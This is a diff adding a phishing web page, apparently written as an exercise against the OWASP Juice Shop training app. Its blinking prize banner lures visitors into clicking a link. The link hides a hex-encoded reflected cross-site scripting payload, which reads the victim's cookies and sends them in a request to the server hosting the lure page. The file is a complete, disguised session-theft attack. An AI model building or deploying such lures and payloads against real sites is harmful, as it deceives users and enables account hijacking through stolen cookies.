@@ -1,0 +1,50 @@
+<!--
+   xss.html
+   
+   Copyright 2018 Live session user <mint@mint>
+   
+   This program is free software; you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation; either version 2 of the License, or
+   (at your option) any later version.
+   
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+   
+   You should have received a copy of the GNU General Public License
+   along with this program; if not, write to the Free Software
+   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
+   MA 02110-1301, USA.
+   
+   
+-->
+
+
+<!DOCTYPE html>
+<head>
+   <style>
+      .blink_me {
+      animation: blinker 1s linear infinite;
+      }
+      @keyframes blinker {
+      50% {
+      opacity: 0;
+      }
+      }
+      body { background-color: #93B874; }
+      h1 { background-color: orange; }
+   </style>
+   <title>Get a free juice!</title>
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+</head>
+<body>
+   <center>
+      <div class="blink_me">
+         <h1>Winner!  Winner! Chicken Dinner!</h1>
+      </div>
+      <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3c%73%63%72%69%70%74%3e%76%61%72%20%78%73%65%73%73%69%6f%6e%3d%64%6f%63%75%6d%65%6e%74%2e%72%65%66%65%72%72%65%72%2e%73%70%6c%69%74%28%22%2f%66%72%65%65%6a%75%69%63%65%22%29%2e%74%6f%53%74%72%69%6e%67%28%29%2e%72%65%70%6c%61%63%65%28%22%2c%22%2c%22%2f%22%29%2e%63%6f%6e%63%61%74%28%22%72%65%63%6f%72%64%64%61%74%61%3f%22%29%2e%63%6f%6e%63%61%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%78%73%65%73%73%69%6f%6e%29%3b%20%76%61%72%20%78%68%74%74%70%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%78%68%74%74%70%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%78%73%65%73%73%69%6f%6e%2c%20%74%72%75%65%29%3b%20%78%68%74%74%70%2e%73%65%6e%64%28%29%3b%20%3c%2f%73%63%72%69%70%74%3e">click here</a> to claim!  </p>
+   </center>
+</body>
+</html>
